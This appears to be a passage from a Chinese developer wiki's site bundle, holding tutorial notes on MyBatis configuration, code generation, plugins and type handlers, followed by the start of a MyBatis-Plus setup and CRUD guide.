\x3c!--这个输出控制台的配置--\x3e\n        <console name="console" target="system_out">\n            \x3c!--控制台只输出level及以上级别的信息（onmatch），其他的直接拒绝（onmismatch） --\x3e\n            \x3c!--<thresholdfilter level="debug" onmatch="accept" onmismatch="deny"/>--\x3e\n            \x3c!--输出日志的格式--\x3e\n            <patternlayout pattern="[%d{yyyy-mm-dd hh:mm:ss:sss}-%t] [%p] - %l - %m%n"/>\n        </console>\n        \x3c!--文件会打印出所有信息，这个log每次运行程序会自动清空，由append属性决定，这个也挺有用的，适合临时测试用--\x3e\n        \x3c!--<file name="log" filename="log/test.log" append="false">--\x3e\n        \x3c!--<patternlayout pattern="%d{hh:mm:ss.sss} %-5level %class{36} %l %m - %msg%xex%n"/>--\x3e\n        \x3c!--</file>--\x3e\n        \x3c!-- 这个会打印出所有的info及以下级别的信息，每次大小超过size，\n        则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档--\x3e\n        <rollingfile name="rollingfileinfo" filename="${logpath}/info.log"\n                     filepattern="${logpath}/info_%d{yyyy-mm-dd}.log">\n            \x3c!--<filters>--\x3e\n            \x3c!--<!–控制台只输出level及以上级别的信息（onmatch），其他的直接拒绝（onmismatch）–>--\x3e\n            \x3c!--<thresholdfilter level="info" onmatch="accept" onmismatch="deny"/>--\x3e\n            \x3c!--<!–<thresholdfilter level="warn" onmatch="deny" onmismatch="neutral"/>–>--\x3e\n            \x3c!--</filters>--\x3e\n            <patternlayout pattern="[%d{yyyy-mm-dd hh:mm:ss:sss}-%t] [%p] - %l - %m%n"/>\n            <policies>\n                \x3c!--按照filepattern 时间单位 interval 间隔生成文件--\x3e\n                <timebasedtriggeringpolicy modulate="true" interval="1"/>\n                \x3c!--定了当日志文件达到了指定的size时，触发rollover操作。size参数可以用kb、mb、gb等做后缀来指定具体的字节数--\x3e\n                \x3c!--<sizebasedtriggeringpolicy size="1g"/>--\x3e\n            </policies>\n        </rollingfile>\n\n\n    </appenders>\n    \x3c!--然后定义logger，只有定义了logger并引入的appender，appender才会生效--\x3e\n    <loggers>\n        \x3c!--过滤掉spring和hibernate的一些无用的debug信息--\x3e\n        <logger name="org.springframework" level="debug">\n        </logger>\n        <logger name="org.elasticsearch" level="info">\n        </logger>\n        <logger name="com.jd.jsf.gd" level="warn">\n        </logger>\n        <logger name="org.mybatis" level="debug">\n        </logger>\n        \x3c!-- 将业务dao接口填写进去,并用控制台输出即可 --\x3e\n        <logger name="com.pwddd.ssmdemo.mapper" level="debug" additivity="false">\n            <appender-ref ref="console"/>\n            <appender-ref ref="rollingfileinfo"/>\n        </logger>\n\n        <root level="info">\n            <appender-ref ref="console"/>\n            <appender-ref ref="rollingfileinfo"/>\n        </root>\n    </loggers>\n\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nmybatis-config.xml配置文件\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapunderscoretocamelcase" value="true"/>\n        <setting name="lazyloadingenabled" value="true"/>\n        \x3c!--        按照需要进行属性的加载--\x3e\n        <setting name="aggressivelazyloading" value="false"/>\n        <setting name="cacheenabled" value="true"/>\n    </settings>\n\n    <typealiases>\n\x3c!--        <typealias type="com.pwddd.mybatis.bean.employee" alias="emp" />--\x3e\n        <package name="com.pwddd.ssmdemo.bean"/>\n    </typealiases>\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nehcache.xml配置文件\n\n<ehcache>\n\n\n    \x3c!--\n        磁盘存储:将缓存中暂时不使用的对象,转移到硬盘,类似于windows系统的虚拟内存\n        path:指定在硬盘上存储对象的路径\n     --\x3e\n    <diskstore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultcache:默认的缓存配置信息,如果不加特殊说明,则所有对象按照此配置项处理\n        maxelementsinmemory:设置了缓存的上限,最多存储多少个记录对象\n        eternal:代表对象是否永不过期\n        timetoidleseconds:最大的发呆时间\n        timetoliveseconds:最大的存活时间\n        overflowtodisk:是否允许对象被写入到磁盘\n     --\x3e\n    <defaultcache maxelementsinmemory="10000" eternal="false"\n                  timetoidleseconds="120" timetoliveseconds="120" overflowtodisk="true" />\n\n    \x3c!--\n        cache:为指定名称的对象进行缓存的特殊配置\n        name:指定对象的完整名\n     --\x3e\n    <cache name="com.zbaccp.entity.person" maxelementsinmemory="10000" eternal="false"\n           timetoidleseconds="300" timetoliveseconds="600" overflowtodisk="true" />\n</ehcache>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 逆向工程\n\nmybatis代码生成器是mybatis提供的一个根据数据库表逆向自动生成xml、javabean等类的工具。\n\nmybatis逆向工程配置：\n\n 1. 引入mybatis-gentator\n\n<dependency>\n    <groupid>org.mybatis.generator</groupid>\n    <artifactid>mybatis-generator-core</artifactid>\n    <version>1.3.7</version>\n</dependency>\n\n<dependency>\n    <groupid>org.mybatis.generator</groupid>\n    <artifactid>mybatis-generator-maven-plugin</artifactid>\n    <version>1.3.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. 编写配置文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype generatorconfiguration\n        public "-//mybatis.org//dtd mybatis generator configuration 1.0//en"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorconfiguration>\n\n    \x3c!--\n        targetruntime="mybatis3simple":生成简单版的crud\n        mybatis3:豪华版\n     --\x3e\n    <context id="mysqltables" targetruntime="mybatis3">\n        \x3c!-- jdbcconnection：指定如何连接到目标数据库 --\x3e\n        <jdbcconnection driverclass="com.mysql.jdbc.driver"\n                        connectionurl="jdbc:mysql://localhost:3306/mybatis?allowmultiqueries=true"\n                        userid="root"\n                        password="123456">\n        </jdbcconnection>\n\n        \x3c!--  --\x3e\n        <javatyperesolver >\n            <property name="forcebigdecimals" value="false" />\n        </javatyperesolver>\n\n        \x3c!-- javamodelgenerator：指定javabean的生成策略\n        targetpackage="test.model"：目标包名\n        targetproject="\\mbgtestproject\\src"：目标工程\n        --\x3e\n        <javamodelgenerator targetpackage="com.pwddd.mybatis.bean"\n                            targetproject=".\\src\\main\\java\\">\n            <property name="enablesubpackages" value="true" />\n            <property name="trimstrings" value="true" />\n        </javamodelgenerator>\n\n        \x3c!-- sqlmapgenerator：sql映射生成策略： --\x3e\n        <sqlmapgenerator targetpackage="mapper"\n                         targetproject=".\\src\\main\\resources\\">\n            <property name="enablesubpackages" value="true" />\n        </sqlmapgenerator>\n\n        \x3c!-- javaclientgenerator:指定mapper接口所在的位置 --\x3e\n        <javaclientgenerator type="xmlmapper" targetpackage="com.pwddd.mybatis.dao"\n                             targetproject=".\\src\\main\\java\\">\n            <property name="enablesubpackages" value="true" />\n        </javaclientgenerator>\n\n        \x3c!-- 指定要逆向分析哪些表：根据表要创建javabean --\x3e\n        <table tablename="tbl_dept" domainobjectname="department"></table>\n        <table tablename="tbl_employee" domainobjectname="employee"></table>\n    </context>\n</generatorconfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 3. 运行\n\n@test\npublic void mbg() throws xmlparserexception, ioexception, invalidconfigurationexception, sqlexception, interruptedexception {\n\nlist<string> warnings = new arraylist<string>();\n    boolean overwrite = true;\n    file configfile = new file("mbg.xml");\n    configurationparser cp = new configurationparser(warnings);\n    configuration config = cp.parseconfiguration(configfile);\n    defaultshellcallback callback = new defaultshellcallback(overwrite);\n    mybatisgenerator mybatisgenerator = new mybatisgenerator(config, callback, warnings);\n    mybatisgenerator.generate(null);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# mybatis运行原理\n\n\n\n\n\n\n# 创建sqlsessionfactory\n\n\n\n\n# 创建sqlsession\n\n\n\n\n# 获取mapper的代理类对象\n\n\n\n\n# 执行查询\n\n\n\n\n# 流程总结\n\n\n\n\n# 插件\n\n\n# 原理\n\n 1. 在四大对象创建的过程中，都会执行interceptorchain.pluginall(param);,获取到所有的interceptor，调用interceptor.plugin(target) 返回target包装之后的对象。\n 2. 我们可以为四大对象创建一个代理对象，aop切面编程的思想。通过代理对象我们就能拦截到四大对象中执行的方法。\n\n\n# 编写插件\n\n 1. 实现interceptor接口\n 2. 实现相关方法\n 3. 使用@interceptor实现插件签名\n 4. 将插件注册到mybatis配置文件中\n\npackage com.pwddd.mybatis.plugins;\n\nimport org.apache.ibatis.executor.statement.statementhandler;\nimport org.apache.ibatis.plugin.*;\n\nimport java.util.properties;\n\n@intercepts(\n        @signature(\n                type = statementhandler.class,\n                method="parameterize",\n                args=java.sql.statement.class\n        )\n)\npublic class myfirstplugin implements interceptor {\n\n    @override\n    public object intercept(invocation invocation) throws throwable {\n        return invocation.proceed();\n    }\n\n    @override\n    public object plugin(object target) {\n        return plugin.wrap(target,this);\n    }\n\n    @override\n    public void setproperties(properties properties) {\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n<plugins>\n    <plugin interceptor="com.pwddd.mybatis.plugins.myfirstplugin">\n        <property name="haha" value="123"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# 扩展\n\n\n# 分页\n\n分页插件地址：mybatis-pagehelper-doc\n\n 1. 引入依赖\n\n<dependency>\n    <groupid>com.github.pagehelper</groupid>\n    <artifactid>pagehelper</artifactid>\n    <version>5.3.0</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. 引入插件\n\n\x3c!-- \n        plugins在配置文件中的位置必须符合要求，否则会报错，顺序如下:\n        properties?, settings?, \n        typealiases?, typehandlers?, \n        objectfactory?,objectwrapperfactory?, \n        plugins?, \n        environments?, databaseidprovider?, mappers?\n    --\x3e\n<plugins>\n    \x3c!-- com.github.pagehelper为pagehelper类所在包名 --\x3e\n    <plugin interceptor="com.github.pagehelper.pageinterceptor">\n        \x3c!-- 使用下面的方式配置参数，后面会有所有的参数介绍 --\x3e\n        <property name="param1" value="value1"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n具体使用方法查看文档。\n\n\n# 批量操作\n\nsqlsession opensession = sqlsessionfactory.opensession(executortype.batch);\n\n\n1\n\n\nspring整合时可以注入一个bean，然后autowired自动注入到dao层，使用该bean创建mapper代理类对象，进行查询。\n\n\n# 自定义类型处理器 type handler\n\n\npublic class myenumempstatustypehandler implements typehandler<empstatus> {\n\n\t/**\n\t * 定义当前数据如何保存到数据库中\n\t */\n\t@override\n\tpublic void setparameter(preparedstatement ps, int i, empstatus parameter,\n\t\t\tjdbctype jdbctype) throws sqlexception {\n\t\t// todo auto-generated method stub\n\t\tsystem.out.println("要保存的状态码："+parameter.getcode());\n\t\tps.setstring(i, parameter.getcode().tostring());\n\t}\n\n\t@override\n\tpublic empstatus getresult(resultset rs, string columnname)\n\t\t\tthrows sqlexception {\n\t\t// todo auto-generated method stub\n\t\t//需要根据从数据库中拿到的枚举的状态码返回一个枚举对象\n\t\tint code = rs.getint(columnname);\n\t\tsystem.out.println("从数据库中获取的状态码："+code);\n\t\tempstatus status = empstatus.getempstatusbycode(code);\n\t\treturn status;\n\t}\n\n\t@override\n\tpublic empstatus getresult(resultset rs, int columnindex)\n\t\t\tthrows sqlexception {\n\t\t// todo auto-generated method stub\n\t\tint code = rs.getint(columnindex);\n\t\tsystem.out.println("从数据库中获取的状态码："+code);\n\t\tempstatus status = empstatus.getempstatusbycode(code);\n\t\treturn status;\n\t}\n\n\t@override\n\tpublic empstatus getresult(callablestatement cs, int columnindex)\n\t\t\tthrows sqlexception {\n\t\t// todo auto-generated method stub\n\t\tint code = cs.getint(columnindex);\n\t\tsystem.out.println("从数据库中获取的状态码："+code);\n\t\tempstatus status = empstatus.getempstatusbycode(code);\n\t\treturn status;\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n<typehandlers>\n    \x3c!--1、配置我们自定义的typehandler  --\x3e\n    <typehandler handler="com.atguigu.mybatis.typehandler.myenumempstatustypehandler" javatype="com.atguigu.mybatis.bean.empstatus"/>\n    \x3c!--2、也可以在处理某个字段的时候告诉mybatis用什么类型处理器\n    保存：#{empstatus,typehandler=xxxx}\n    查询：\n     <resultmap type="com.atguigu.mybatis.bean.employee" id="myemp">\n       <id column="id" property="id"/>\n       <result column="empstatus" property="empstatus" typehandler=""/>\n      </resultmap>\n    注意：如果在参数位置修改typehandler，应该保证保存数据和查询数据用的typehandler是一样的。\n    --\x3e\n</typehandlers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"MyBatis-Plus",frontmatter:{title:"MyBatis-Plus",date:"2022-01-16T00:00:00.000Z",permalink:"/dev/java/core/mybatisplus",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Mabatis","MyBatisPlus"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/03.MyBatisPlus.html",relativePath:"01.开发/101.后端/1011.微服务核心/03.MyBatisPlus.md",key:"v-68562108",path:"/dev/java/core/mybatisplus/",headers:[{level:2,title:"相关资源",slug:"相关资源",normalizedTitle:"相关资源",charIndex:132},{level:2,title:"前期准备",slug:"前期准备",normalizedTitle:"前期准备",charIndex:193},{level:3,title:"创建库表",slug:"创建库表",normalizedTitle:"创建库表",charIndex:202},{level:3,title:"编写对应的javaBean",slug:"编写对应的javabean",normalizedTitle:"编写对应的javabean",charIndex:819},{level:3,title:"导入依赖",slug:"导入依赖",normalizedTitle:"导入依赖",charIndex:2484},{level:3,title:"spring配置文件配置",slug:"spring配置文件配置",normalizedTitle:"spring配置文件配置",charIndex:3843},{level:3,title:"log4j配置文件",slug:"log4j配置文件",normalizedTitle:"log4j配置文件",charIndex:6106},{level:3,title:"mybatis配置文件",slug:"mybatis配置文件",normalizedTitle:"mybatis配置文件",charIndex:6917},{level:3,title:"替换mybatisplus",slug:"替换mybatisplus",normalizedTitle:"替换mybatisplus",charIndex:7153},{level:2,title:"入门通用CRUD",slug:"入门通用crud",normalizedTitle:"入门通用crud",charIndex:7352},{level:3,title:"Insert",slug:"insert",normalizedTitle:"insert",charIndex:7365},{level:3,title:"Update",slug:"update",normalizedTitle:"update",charIndex:11855},{level:3,title:"Select",slug:"select",normalizedTitle:"select",charIndex:12369},{level:3,title:"delete",slug:"delete",normalizedTitle:"delete",charIndex:14570},{level:3,title:"MP启动注入SQL的原理",slug:"mp启动注入sql的原理",normalizedTitle:"mp启动注入sql的原理",charIndex:15083},{level:2,title:"条件构造器",slug:"条件构造器",normalizedTitle:"条件构造器",charIndex:15409},{level:2,title:"活动记录 - ActiveRecord",slug:"活动记录-activerecord",normalizedTitle:"活动记录 - activerecord",charIndex:17263},{level:2,title:"代码生成器",slug:"代码生成器",normalizedTitle:"代码生成器",charIndex:19031},{level:2,title:"插件",slug:"插件",normalizedTitle:"插件",charIndex:14562},{level:3,title:"分页插件",slug:"分页插件",normalizedTitle:"分页插件",charIndex:14560},{level:3,title:"执行分析插件",slug:"执行分析插件",normalizedTitle:"执行分析插件",charIndex:21527},{level:3,title:"乐观锁插件",slug:"乐观锁插件",normalizedTitle:"乐观锁插件",charIndex:21821},{level:3,title:"执行分析插件",slug:"执行分析插件-2",normalizedTitle:"执行分析插件",charIndex:21527},{level:3,title:"测试代码",slug:"测试代码",normalizedTitle:"测试代码",charIndex:22412},{level:2,title:"自定义全局操作",slug:"自定义全局操作",normalizedTitle:"自定义全局操作",charIndex:24365},{level:3,title:"AutoSqlInjector",slug:"autosqlinjector",normalizedTitle:"autosqlinjector",charIndex:15376},{level:3,title:"逻辑删除",slug:"逻辑删除",normalizedTitle:"逻辑删除",charIndex:26116},{level:2,title:"公共字段自动填充",slug:"公共字段自动填充",normalizedTitle:"公共字段自动填充",charIndex:26959},{level:2,title:"Idea插件",slug:"idea插件",normalizedTitle:"idea插件",charIndex:28459}],headersStr:"相关资源 前期准备 创建库表 编写对应的javaBean 导入依赖 spring配置文件配置 log4j配置文件 mybatis配置文件 替换mybatisplus 入门通用CRUD Insert Update Select delete MP启动注入SQL的原理 条件构造器 活动记录 - ActiveRecord 代码生成器 插件 分页插件 执行分析插件 乐观锁插件 执行分析插件 测试代码 自定义全局操作 AutoSqlInjector 逻辑删除 公共字段自动填充 Idea插件",content:'# MyBatisPlus\n\n> MyBatis-Plus(简称 MP),是一个 MyBatis 的增强工具包，只做增强不做改变。 为简化开发工作、提高生产率而生我们的愿景是成为 Mybatis最好的搭档，就像魂斗罗中的 1P、2P，基友搭配，效率翻倍。\n\n\n# 相关资源\n\nMyBatis-Plus (baomidou.com)\n\nGitHub - mybatis-plus\n\n\n# 前期准备\n\n\n# 创建库表\n\n-- 创建库\nCREATE DATABASE mp;\n-- 使用库\nUSE mp;\n-- 创建表\nCREATE TABLE tbl_employee(\n id INT(11) PRIMARY KEY AUTO_INCREMENT,\n last_name VARCHAR(50),\n email VARCHAR(50),\n gender CHAR(1),\n age int\n);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'Tom\',\'tom@atguigu.com\',1,22);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'Jerry\',\'jerry@atguigu.com\',0,25);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'Black\',\'black@atguigu.com\',1,30);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'White\',\'white@atguigu.com\',0,35);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 编写对应的javaBean\n\npackage com.pwddd.mp.bean;\n\npublic class Employee {\n    private Integer id;\n    private String lastName;\n    private String email;\n    private Integer gender;\n    private Integer age;\n\n    @Override\n    public String toString() {\n        return "Employee{" +\n                "id=" + id +\n                ", lastName=\'" + lastName + \'\\\'\' +\n                ", email=\'" + email + \'\\\'\' +\n                ", gender=" + gender +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getLastName() {\n        return lastName;\n    }\n\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public Integer getGender() {\n        return gender;\n    }\n\n    public void setGender(Integer gender) {\n        this.gender = gender;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public Employee() {\n    }\n\n    public Employee(Integer id, String lastName, String email, Integer gender, Integer age) {\n        this.id = id;\n        this.lastName = lastName;\n        this.email = email;\n        this.gender = gender;\n        this.age = age;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# 导入依赖\n\n<dependencies>\n\n    \x3c!-- mp 依赖 --\x3e\n    <dependency>\n        <groupId>com.baomidou</groupId>\n        <artifactId>mybatis-plus</artifactId>\n        <version>2.3</version>\n    </dependency>\n    \x3c!--junit --\x3e\n    <dependency>\n        <groupId>junit</groupId>\n        <artifactId>junit</artifactId>\n        <version>4.9</version>\n    </dependency>\n    \x3c!-- log4j --\x3e\n    <dependency>\n        <groupId>log4j</groupId>\n        <artifactId>log4j</artifactId>\n        <version>1.2.17</version>\n    </dependency>\n    \x3c!-- c3p0 --\x3e\n    <dependency>\n        <groupId>com.mchange</groupId>\n        <artifactId>c3p0</artifactId>\n        <version>0.9.5.2</version>\n    </dependency>\n    \x3c!-- mysql --\x3e\n    <dependency>\n        <groupId>mysql</groupId>\n        <artifactId>mysql-connector-java</artifactId>\n        <version>5.1.37</version>\n    </dependency>\n    \x3c!-- spring --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-context</artifactId>\n        <version>4.3.10.RELEASE</version>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-orm</artifactId>\n        <version>4.3.10.RELEASE</version>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# spring配置文件配置\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n        xmlns:context="http://www.springframework.org/schema/context"\n        xmlns:tx="http://www.springframework.org/schema/tx"\n        xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd\n        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd">\n        \x3c!-- 数据源 --\x3e\n    <context:property-placeholder location="classpath:db.properties"/>\n    <bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource">\n        <property name="driverClass" value="${jdbc.driver}" />\n        <property name="jdbcUrl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n        \x3c!-- 事务管理器 --\x3e\n    <bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\n        <property name="dataSource" ref="dataSource" />\n    </bean>\n        \x3c!-- 基于注解的事务管理 --\x3e\n    <tx:annotation-driven transaction-manager="dataSourceTransactionManager"/>\n            \x3c!-- 配置 SqlSessionFactoryBean --\x3e\n\x3c!--      <bean id="sqlSessionFactoryBean" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean">  --\x3e\n        \x3c!-- 数据源 --\x3e\n\n        <bean id="sqlSessionFactoryBean" class="org.mybatis.spring.SqlSessionFactoryBean">\n        <property name="dataSource" ref="dataSource" />\n        <property name="configLocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- 别名处理 --\x3e\n        <property name="typeAliasesPackage" value="com.pwddd.mp.beans" />\n    </bean>\n        \x3c!--\n        配置 mybatis 扫描 mapper 接口的路径\n        --\x3e\n    <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer">\n        <property name="basePackage" value="com.pwddd.mp.mapper" />\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# log4j配置文件\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE log4j:configuration SYSTEM "log4j.dtd">\n<log4j:configuration xmlns:log4j="http://jakarta.apache.org/log4j/">\n    <appender name="STDOUT" class="org.apache.log4j.ConsoleAppender">\n        <param name="Encoding" value="UTF-8" />\n        <layout class="org.apache.log4j.PatternLayout">\n            <param name="ConversionPattern" value="%-5p %d{MM-dd HH:mm:ss,SSS} %m (%F:%L) \\n" />\n        </layout>\n    </appender>\n    <logger name="java.sql">\n        <level value="debug" />\n    </logger>\n    <logger name="org.apache.ibatis">\n        <level value="info" />\n    </logger>\n    <root>\n        <level value="debug" />\n        <appender-ref ref="STDOUT" />\n    </root>\n</log4j:configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# mybatis配置文件\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 替换mybatisplus\n\nspring配置文件中将我们添加的sqlSessionFactoryBean替换为MybatisSqlSessionFactoryBean。\n\n<bean id="sqlSessionFactoryBean" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean">\n\n\n1\n\n\n\n# 入门通用CRUD\n\n\n# Insert\n\n提出问题: 假设我们已存在一张tbl_employee表，且已有对应的实体类Employee，实现tbl_employee表的CRUD操作我们需要做什么呢？\n\n实现方式:\n\n基于Mybatis：需要编写EmployeeMapper接口，并手动编写CRUD方法 提供EmployeeMapper.xml映射文件，并手动编写每个方法对应的SQL语句.\n\n基于MP：只需要创建EmployeeMapper接口, 并继承BaseMapper接口.这就是使用MP需要完成的所有操作，甚至不需要创建SQL映射文件。\n\n 1. 编写接口集成BaseMapper\n\npackage com.pwddd.mp.mapper;\n\nimport com.baomidou.mybatisplus.mapper.BaseMapper;\nimport com.pwddd.mp.bean.Employee;\n\n// 泛型 填写当前Mapper所对应的实体类\npublic interface EmployeeMapper extends BaseMapper<Employee> {\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. 编写测试方法\n\nprivate ApplicationContext ac = new ClassPathXmlApplicationContext("applicationContext.xml");\nprivate EmployeeMapper employeeMapper = ac.getBean("employeeMapper", EmployeeMapper.class);\n\n@Test\npublic void testEnv() throws SQLException {\n    Employee employee = new Employee();\n    employee.setLastName("zhangsan");\n    employee.setEmail("zhangsan@qq.com");\n    employee.setGender(1);\n    employee.setAge(24);\n    System.out.println(employeeMapper.insert(employee));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n运行时会抛异常，主要原因时id的类型为问题。\n\n Could not set property \'id\' of \'class com.pwddd.mp.bean.Employee\' with value \'1496379627045040130\' Cause: java.lang.IllegalArgumentException: argument type mismatch\n\n\n1\n\n\n出现异常的原因：mybatisplus提供了四种主键的策略。我们并没有设置主键的策略，对于MybatisPlus来说，有如下的几种主键策略:\n\n值               描述\nAUTO            数据库 ID 自增\nNONE            无状态，该类型为未设置主键类型（注解里等于跟随全局，全局里约等于 INPUT）\nINPUT           insert 前自行 set 主键值\nASSIGN_ID       分配 ID(主键类型为 Number(Long 和 Integer)或 String)(since\n                3.3.0),使用接口IdentifierGenerator的方法nextId(默认实现类为DefaultIdentifierGenerator雪花算法)\nASSIGN_UUID     分配 UUID,主键类型为 String(since\n                3.3.0),使用接口IdentifierGenerator的方法nextUUID(默认 default 方法)\nID_WORKER       分布式全局唯一 ID 长整型类型(please use ASSIGN_ID) 弃用\nUUID            32 位 UUID 字符串(please use ASSIGN_UUID) 弃用\nID_WORKER_STR   分布式全局唯一 ID 字符串类型(please use ASSIGN_ID) 弃用\n\n在开发过程中，使用TableId设置主键策略。共有两个属性：\n\n * value: 如果表中数据的值和项目中bean的属性名不同，或者不遵行驼峰命名法，则需要进行设置\n * type: 设置主键策略IdType的枚举，需要对应表中的主键的策略。\n\npublic class Employee {\n\n    @TableId(value = "id",type = IdType.AUTO)\n    private Integer id;\n\n\n1\n2\n3\n4\n\n\n修改后又报错：\n\n### Error updating database.  Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table \'mybatisplus.employee\' doesn\'t exist\n\n\n1\n\n\n出现这个问题的原因是，mybatisplus会根据实体类的类名去数据库中找相关的表名。因为我们数据库中的表名称和类名并不对应，因此会报错。mybatisplus也提供了相关的注解去设置寻找的名称。TableName\n\n@TableName("tbl_employee")\npublic class Employee {\n\n\n1\n2\n\n\n如果数据库的相关列和实体类的的名称不对应，(如last_name和lastName)。mybaitsPlus是如何保证数据能够转化。\n\nMP全局策略配置中有如下的默认配置，该配置类似于mybatis的驼峰命名法的转化，并且默认开启。\n\n<bean id="globalConfiguration" class="com.baomidou.mybatisplus.entity.GlobalConfiguration">\n    <property name="dbColumnUnderline" value="true" 